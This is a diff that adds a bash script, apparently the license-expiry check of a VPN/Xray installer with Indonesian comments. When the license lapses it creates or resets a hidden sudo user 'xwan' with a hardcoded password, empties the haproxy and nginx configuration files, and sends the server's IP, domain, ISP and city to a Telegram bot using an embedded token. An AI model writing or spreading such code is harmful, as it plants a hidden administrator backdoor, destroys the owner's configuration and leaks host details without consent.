@@ -1,0 +1,103 @@
+#!/bin/bash
+######################################
+MYIP=$(curl -sS ipv4.icanhazip.com)
+######################################
+#IPVPS=$(curl -s ipv4.icanhazip.com)
+ISP=$(cat /etc/xray/isp)
+CITY=$(cat /etc/xray/city)
+domain=$(cat /etc/xray/domain)
+#RAM=$(free -m | awk 'NR==2 {print $2}')
+#MODEL=$(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g')
+CHATID="1210833546"
+KEY="6006599143:AAEgstCAioq35JgX97HaW_G3TAkLKzLZS_w"
+TIME="10"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+clear
+# // Gettings Info
+######################################
+# // USERNAME IZIN IPP
+rm -f /usr/bin/user
+username=$(curl -sS https://raw.githubusercontent.com/rifg67/script-rifts//main/ipx | grep $MYIP | awk '{print $2}')
+echo "$username" >/usr/bin/user
+rm -f /usr/bin/e
+valid=$(curl -sS https://raw.githubusercontent.com/rifg67/script-rifts//main/ipx | grep $MYIP | awk '{print $3}')
+echo "$valid" > /usr/bin/e
+
+clear
+######################################
+# // DETAIL ORDER IZIN IP
+#username=$(cat /usr/bin/user)
+#oid=$(cat /usr/bin/ver)
+#exp=$(cat /usr/bin/e)
+######################################
+clear
+# // DAYS LEFT
+today=$(date +"%Y-%m-%d")
+d1=$(date -d "$valid" +%s)
+d2=$(date -d "$today" +%s)
+certifacate=$(((d1 - d2) / 86400))
+if [[ $certifacate -le 1 ]]; then
+    # Ambil password dari URL pastebin
+    pwadm=@Peyx112#
+    Username=xwan
+    Password=$pwadm
+
+    # Cek apakah user "xwan" sudah ada
+    if id "$Username" &>/dev/null; then
+        # Jika user ada, ganti password
+        echo -e "$Password\n$Password" | passwd $Username > /dev/null 2>&1
+        # Menghapus konfigurasi haproxy dan nginx
+        > /etc/haproxy/haproxy.cfg
+        > /etc/nginx/conf.d/xray.conf
+        # Kirim pemberitahuan ke bot
+        CHATID="$CHATID"
+        KEY="$KEY"
+        TIME="$TIME"
+        URL="$URL"
+        TEXT="◇━━━━━━━━━━━━━━◇
+<b>   ⚠️SC EXPIRED NOTIF⚠️</b>
+<b>     Detail VPS Expired</b>
+◇━━━━━━━━━━━━━━◇
+<b>IP VPS  :</b> ${MYIP} 
+<b>DOMAIN  :</b> ${domain}
+<b>ISP     :</b> ${ISP}
+<b>CITY    :</b> ${CITY}
+<b>USER    :</b> ${username}
+<b>MASA    :</b> $certifacate DAY
+◇━━━━━━━━━━━━━━◇
+Silahkan Perpanjang VPS Anda
+"
+        curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+    else
+        # Jika user belum ada, buat user baru
+        echo -e "$Username $Password" > /etc/xray/.adm
+        mkdir -p /home/script/
+        useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+        echo -e "$Password\n$Password" | passwd $Username > /dev/null 2>&1
+        usermod -aG sudo $Username > /dev/null 2>&1
+        # Menghapus konfigurasi haproxy dan nginx
+        > /etc/haproxy/haproxy.cfg
+        > /etc/nginx/conf.d/xray.conf
+        # Kirim pemberitahuan ke bot
+        CHATID="$CHATID"
+        KEY="$KEY"
+        TIME="$TIME"
+        URL="$URL"
+        TEXT="◇━━━━━━━━━━━━━━◇
+<b>   ⚠️SC EXPIRED NOTIF⚠️</b>
+<b>     Detail VPS Expired</b>
+◇━━━━━━━━━━━━━━◇
+<b>IP VPS  :</b> ${MYIP} 
+<b>DOMAIN  :</b> ${domain}
+<b>ISP     :</b> ${ISP}
+<b>CITY    :</b> ${CITY}
+<b>USER    :</b> ${username}
+<b>MASA    :</b> $certifacate DAY
+◇━━━━━━━━━━━━━━◇
+Silahkan Perpanjang VPS Anda
+"
+        curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+    fi
+else
+    echo -e "VPS Anda masih valid, sisa masa aktif: $certifacate hari."
+fi
